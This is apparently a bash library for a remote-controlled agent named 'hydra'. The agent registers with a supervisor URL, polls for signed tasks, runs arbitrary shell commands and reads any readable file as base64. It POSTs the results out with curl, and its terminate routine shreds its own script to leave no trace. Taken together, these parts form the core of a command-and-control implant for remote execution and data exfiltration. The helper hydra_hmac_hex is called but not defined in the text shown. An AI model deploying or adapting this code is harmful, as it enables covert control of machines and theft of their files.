# Six primitives: register, poll, exec, read, report, terminate.

hydra_json_escape() {
  python3 -c "import json,sys; sys.stdout.write(json.dumps(sys.stdin.read()))"
}

hydra_exec_cmd() {
  # $1=cmd  $2=timeout_s
  local cmd="$1" t="$2"
  local out_file err_file start end exit_code
  out_file=$(mktemp); err_file=$(mktemp)
  start=$(date +%s%3N 2>/dev/null || python3 -c 'import time;print(int(time.time()*1000))')
  timeout "$t" bash -c "$cmd" >"$out_file" 2>"$err_file"; exit_code=$?
  end=$(date +%s%3N 2>/dev/null || python3 -c 'import time;print(int(time.time()*1000))')
  local stdout_json stderr_json
  stdout_json=$(hydra_json_escape <"$out_file")
  stderr_json=$(hydra_json_escape <"$err_file")
  rm -f "$out_file" "$err_file"
  printf '{"stdout":%s,"stderr":%s,"exit_code":%d,"wall_ms":%d}' \
    "$stdout_json" "$stderr_json" "$exit_code" "$((end - start))"
}

hydra_read_file() {
  # $1=path  $2=max_bytes  $3=scope (home|any)
  local path="$1" max="$2" scope="$3"
  if [ "$scope" = "home" ]; then
    case "$path" in
      "$HYDRA_HOME"/*) ;;
      *) printf '{"err":"policy","reason":"path-outside-home"}'; return 1 ;;
    esac
  fi
  if [ ! -r "$path" ]; then
    printf '{"err":"unreadable"}'; return 1
  fi
  local size truncated content_b64
  size=$(stat -c '%s' "$path" 2>/dev/null || stat -f '%z' "$path")
  if [ "$size" -gt "$max" ]; then truncated=true; else truncated=false; fi
  content_b64=$(head -c "$max" "$path" | base64 -w 0 2>/dev/null || head -c "$max" "$path" | base64)
  printf '{"size":%d,"truncated":%s,"content_b64":"%s"}' "$size" "$truncated" "$content_b64"
}

hydra_register() {
  # $1=supervisor_url  $2=mission_id  $3=fingerprint  $4=platform  $5=version
  curl -fsS -X POST "$1/v1/register" \
    -H 'Content-Type: application/json' \
    -d "{\"mission_id\":\"$2\",\"fingerprint\":\"$3\",\"platform\":\"$4\",\"version\":\"$5\"}"
}

hydra_poll() {
  # $1=supervisor_url  $2=mission_id  $3=session_key  $4=last_op_id
  local ts sig path
  ts=$(date +%s)
  path="/v1/poll?mission=$2"
  sig=$(hydra_hmac_hex "$3" 'GET' "$path" '' "$ts")
  curl -fsS "$1$path" -H "X-Hydra-Sig: $sig" -H "X-Hydra-Ts: $ts"
}

hydra_report() {
  # $1=supervisor_url  $2=mission_id  $3=session_key  $4=op_id  $5=ok(true|false)  $6=payload_inline_json
  local ts sig body
  ts=$(date +%s)
  body="{\"mission_id\":\"$2\",\"op_id\":\"$4\",\"ok\":$5,\"data\":$6,\"wall_ms\":0}"
  sig=$(hydra_hmac_hex "$3" 'POST' '/v1/report' "$body" "$ts")
  curl -fsS -X POST "$1/v1/report" \
    -H "X-Hydra-Sig: $sig" -H "X-Hydra-Ts: $ts" -H 'Content-Type: application/json' \
    -d "$body"
}

hydra_terminate() {
  rm -rf "$HYDRA_HOME" 2>/dev/null
  shred -u "$0" 2>/dev/null || rm -f "$0"
  exit 0
}
